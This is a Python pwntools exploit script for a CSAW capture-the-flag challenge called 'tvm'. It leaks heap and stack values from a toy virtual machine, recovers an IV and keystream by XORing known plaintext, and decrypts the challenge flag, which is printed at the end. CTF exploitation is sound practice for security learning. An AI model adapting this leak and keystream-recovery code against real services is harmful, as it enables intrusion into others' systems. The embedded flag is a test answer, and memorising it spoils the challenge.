#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.chal.csaw.io --port 1007 ./tvm
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./tvm')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.chal.csaw.io'
port = int(args.PORT or 1007)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x401267
b *0x4034A6
b *0x0000000000402E06
continue
'''.format(**locals())
#tbreak *0x{exe.entry:x}
#b *0x000000000040129F

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# stack limit?: 0x3ff7
# prints out illegal memory access :))
# struct crypto {
#     uint32_t what;
#     unsigned char rand[12];
#     EVP_CIPHER_CTX *ctx;
# }


io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

#io.recvuntil("bytecode:\n")
time.sleep(0.2)

with open("out.bin", "rb") as f:
    bytecode = f.read()

io.send(bytecode)

io.recvuntil("----- TVM Stack Dump -----")
io.recvline()
heap_leak = int(io.recvline().split(" ")[1], 16)
log.info("heap leak: {:#x}".format(heap_leak))
io.recvuntil("TVM RUNNING")

# leak the IV from the stack
io.recvuntil("----- TVM Stack Dump -----\n")
io.recvline()

def get_stack_val():
    return int(io.recvline().split(" ")[1], 16)

leak1 = get_stack_val()
leak2 = get_stack_val()
log.info("{:#x}".format(leak1))
log.info("{:#x}".format(leak2))

import binascii
iv = binascii.unhexlify(hex(leak2)[2:-8])[::-1]
iv += binascii.unhexlify(hex(leak1)[2:].ljust(16, "0"))[::-1]
log.info("iv: {}".format(binascii.hexlify(iv)))
io.recvuntil("TVM RUNNING")

# dump encrypted
io.recvuntil("KRX: [ ")
krx_leak = binascii.unhexlify(io.recvline()[:-2].replace(" ", ""))
log.info(binascii.hexlify(krx_leak))
io.recvuntil("TVM RUNNING")

def find_keystream(enc):
    plaintext = "A"*32
    keystream = bytearray()
    for i in range(32):
        b = enc[i]
        p = plaintext[i]
        keystream.append(ord(b) ^ ord(p))
    return keystream

keystream = find_keystream(krx_leak)
log.info("keystream: {}".format(binascii.hexlify(keystream)))

# now test that we actually have the key stream by encrypting something
# else and attempting to decrypt that based on the keystream
io.recvuntil("KRX: [ ")
krx_leak = binascii.unhexlify(io.recvline()[:-2].replace(" ", ""))
log.info("krx 2: {}".format(binascii.hexlify(krx_leak)))
io.recvuntil("TVM RUNNING")

def decrypt(enc, keystream):
    plaintext = bytearray()
    for i in range(32):
        plaintext.append(ord(enc[i]) ^ keystream[i])
    return plaintext

plain = decrypt(krx_leak, keystream)
log.info(plain)

# now get the motherflippin' flag
io.recvuntil("KRX: [ ")
krx_leak = binascii.unhexlify(io.recvline()[:-2].replace(" ", ""))
log.info("krx 3: {}".format(binascii.hexlify(krx_leak)))

io.recvuntil("TVM RUNNING")
io.recvline()

io.close()

plain = decrypt(krx_leak, keystream)
log.info(plain)

# [*] flag{C4nt_3vEn_Tru5t_4_GCM_TVM}
